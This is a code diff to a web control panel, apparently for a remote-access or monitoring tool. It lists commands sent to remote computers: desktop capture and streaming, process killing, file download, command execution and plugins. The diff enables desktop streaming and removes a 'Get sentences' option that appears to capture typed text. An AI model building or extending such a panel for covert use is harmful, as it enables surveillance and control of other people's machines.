@@ -30,7 +30,6 @@
                 <select id="command" class="form-control">
                     <option value="@Library.ECommand.DO_NOTHING">Do nothing</option>
                     <option value="@Library.ECommand.UPLOAD_IMAGE">Get desktop image</option>
-                    <option value="@Library.ECommand.UPLOAD_SENTENCES">Get sentences</option>
                     <option value="@Library.ECommand.UPLOAD_PROCESS_INFO">Get processes</option>
                     <option value="@Library.ECommand.KILL_PROCESS">Kill Process</option>
                     <option value="@Library.ECommand.UPLOAD_PORT_INFO">Get port info</option>
@@ -38,8 +37,8 @@
                     @*<option value="@Library.ECommand.DOWNLOAD_FILE">Upload a file</option>*@
                     <option value="@Library.ECommand.UPLOAD_FILE">Download a file</option>
                     <option value="@Library.ECommand.UPLOAD_FILE_EVENTS">Get file events</option>
-                    @*<option value="@Library.ECommand.STREAM_DESKTOP">Start streaming desktop</option>
-                    <option value="@Library.ECommand.STOP_STREAM_DESKTOP">Stop streaming desktop</option>*@
+                    <option value="@Library.ECommand.STREAM_DESKTOP">Start streaming desktop</option>
+                    <option value="@Library.ECommand.STOP_STREAM_DESKTOP">Stop streaming desktop</option>
                     <option value="@Library.ECommand.EXECUTE_COMMAND">Execute a command</option>
                     <option value="@Library.ECommand.SET_TRANSMISSION_INTERVAL">Set transmission time</option>
                     <option value="@Library.ECommand.EXECUTE_PLUGIN">Execute Plugin</option>
@@ -82,7 +81,7 @@
     var cursorY = 0;
     var computerList = {};
     var computerHash = "";
-
+    var imageStreamTimer = null;
 
     function updateImage() {
         $.get('/Home/GetImageLastAccessTime?image=latest.jpg').done(function (lastAccessTime) {
@@ -90,8 +89,19 @@
                 $('#data').html("");
                 var img = $('<img />').attr('width', '100%').attr('src', "/Home/GetImage?image=latest.jpg&" + lastAccessTime);
                 $('#data').html(img);
-            }, 1000);
+            }, 2000);
         });
+    }
+    function startStreamImage(time) {
+        time = parseInt(time) + 2000;
+        imageStreamTimer = setInterval(function () {
+            updateImage();
+        }, time);
+    }
+    function stopStreamImage() {
+        if (imageStreamTimer != null) {
+            clearInterval(imageStreamTimer);
+        }
     }
     function updateProcesses() {
         $.get('/Home/GetProcesses')
@@ -102,13 +112,6 @@
     }
     function updateFileEvents() {
         $.get('/Home/GetFileEvents')
-            .done(function (text) {
-                var txt = $('<textarea />').addClass('form-control').attr('cols', '100').attr('rows', '20').val(text);
-                $('#data').html(txt);
-            });
-    }
-    function updateSentences() {
-        $.get('/Home/GetSentences')
             .done(function (text) {
                 var txt = $('<textarea />').addClass('form-control').attr('cols', '100').attr('rows', '20').val(text);
                 $('#data').html(txt);
@@ -192,8 +195,11 @@
                 case '@Library.ECommand.UPLOAD_IMAGE':
                     updateImage();
                     break;
-                case '@Library.ECommand.UPLOAD_SENTENCES':
-                    updateSentences();
+                case '@Library.ECommand.STREAM_DESKTOP':
+                    startStreamImage(parameters);
+                    break;
+                case '@Library.ECommand.STOP_STREAM_DESKTOP':
+                    stopStreamImage();
                     break;
                 case '@Library.ECommand.UPLOAD_PORT_INFO':
                     updatePortInfo();
